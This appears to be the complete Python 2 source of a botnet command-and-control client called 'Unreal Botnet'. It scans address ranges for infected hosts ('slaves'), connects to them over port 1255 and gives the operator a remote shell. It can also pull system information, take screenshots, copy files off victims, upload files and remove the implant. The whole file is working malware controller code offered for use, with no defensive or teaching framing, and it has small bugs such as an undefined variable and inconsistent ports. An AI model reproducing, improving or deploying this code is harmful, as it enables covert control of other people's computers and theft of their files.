#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import sys
import subprocess
import ipaddress
import time
import platform
import os

unrealport = 1255

def Scan():
	print '1. Scan all\n2. Scan only one'
	c = raw_input('>')
	if len(c) == 0: sys.exit(0)
	elif c == '1':
		Slaves = []
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket.setdefaulttimeout(.5)
		print 'Address: [Ex: 192.168.1.0/24]'
		hostin = raw_input('>')
		if len(hostin) == 0: sys.exit(0)
		ip_net = ipaddress.ip_network(unicode(hostin))
		all_hosts = list(ip_net.hosts())
		for i in range(0, len(all_hosts)):
			result = sock.connect_ex((unicode(all_hosts[i]), 1232))
			if result == 0:
				print 'Slave found! :'+ s
			else:
				print unicode(all_hosts[i]), ' Not founded...'
				continue
	elif c == '2':
		Slaves = []
		print 'Host Address:'
		host = raw_input('>')
		if len(host) == 0: sys.exit(0)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = s.connect_ex((host, unrealport))
			if result == 0:
				Slaves.append(host)
				print "-" * 15
				print '| Slave found! :' +str(Slaves)+'|'
				print '-' * 15
				s.close()
			else:
				print 'Host without the Unreal Botnet'
		except KeyboardInterrupt:
			print 'You pressed Ctrl+C'
			sys.exit(0)
		except socket.error as e:
			print e
def control(host):
	once = True
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect((host,unrealport))
	subprocess.call('clear', shell=True)
	print 'Connected!'
	print '1. Return the Shell\n2. Close Connection\n3. Remove [X]\n4. Exit'
	s = raw_input('>')
	if len(s) == 0: sys.exit(0)
	elif s == '1':
		PATH = '$'
		UNAME = ''
		while True:
			if once:
				sock.send('uname')
				d = sock.recv(1024)
				osn = d.split('?', 4)
				print '| Name: ', osn[0], 'OS:', osn[1]+','+osn[2]+'|'
				print'|'+osn[3]+'|'
				print '|Architeture: '+osn[4]+'|'
				UNAME = osn[0]
				once = False
				d = ''
			cmd = raw_input(UNAME+'@'+PATH+'>')
			if len(cmd) == 0:
				print "Can't be empty"
				continue
			if cmd[:5] == 'where':
				sock.send('whereis')
				d = sock.recv(1024)
				PATH = d
				d = ''
			elif cmd[:3] == 'cd ':
				sock.send(cmd)
				while True:
					bd = sock.recv(1024)
					if bd[:4] == 'err+':
						x = bd.split('+', 1)
						print x[1]
						break
					else:
						PATH = bd
						bd = ''
						break
			elif cmd[:6] == 'sysinf':
				sock.send('sysinf')
				d = sock.recv(1024)
				print d
				d = ''
			elif cmd[:7] == 'print()':
				sock.send('print')
				d = sock.recv(1024)
				if d[:5] == 'imgok':
					sock.send('send')
					d = ''
					l = sock.recv(1024)
					f = open(os.getcwd()+'/screenshot.png', 'wb')
					while (l):
						f.write(l)
						l = sock.recv(1024)
					f.close()
					print 'Received.. check {}'.format(os.getcwd())
					main()
			elif cmd[:5] == 'uname':
				sock.send('uname')
				d = sock.recv(1024)
				un = d.split('?', 2)
				print 'PC name: {}\nOS: {}, {}'.format(un[0], un[1], un[2])
				d = ''
			elif cmd[:4] == 'copy':
				sock.send('copyfile')
				d = sock.recv(1024)
				if d[:2] == 'ok':
					path = raw_input('FILE PATH>')
					if path == 'exit': break
					spath = raw_input('PATH TO SAVE>')
					if spath == 'exit': break
					sock.send(path)
					f = open(spath, 'wb')
					l = sock.recv(1024)
					while (l):
						print 'Receiving...'
						f.write(l)
						l = sock.recv(1024)
					f.close()
					print 'Done...'
					main()
			elif cmd[:3] == 'rem':
				sock.send(cmd)
				print sock.recv(1024)
			elif cmd[:3] == 'put':
				sock.send('sendfile')
				data = sock.recv(1024)
				if data[:6] == 'ready':
					path = raw_input('PATH>')
					spath = raw_input('PATH TO>')
					f = open(path, 'rb')
					sock.send(spath)
					print 'Sending..'
					l = f.read(1024)
					while (l):
						sock.send(l)
						l = f.read(1024)
					f.close()
					print 'Done..'
					time.sleep(1)
					sock.close()
					main()
			elif cmd[:5] == '.exit':
				sock.send('rexit')
				main()
			else:
				sock.send(cmd)
				while True:
					data = sock.recv(1024)
					if len(data) == 0: break
					print data
					data = ''
					break
	elif s == '2':
		sock.close()
		print 'Closed.'
		main()
	elif s == '3':
		sock.send('rootexit')
		print 'Removed'
		main()
	elif s == '4':
		sock.send('close')
		sock.close()
		main()
def main():
	while True:
		print '1. Connect\n2. Scan for slaves\n3.Exit'
		r = raw_input('>')
		if len(r) == 0: break
		elif r == '1':
			h = raw_input('>')
			if len(h) == 0: break
			control(h)
		elif r == '2':
			Scan()
		elif r == '3':
			sys.exit(0)
main()
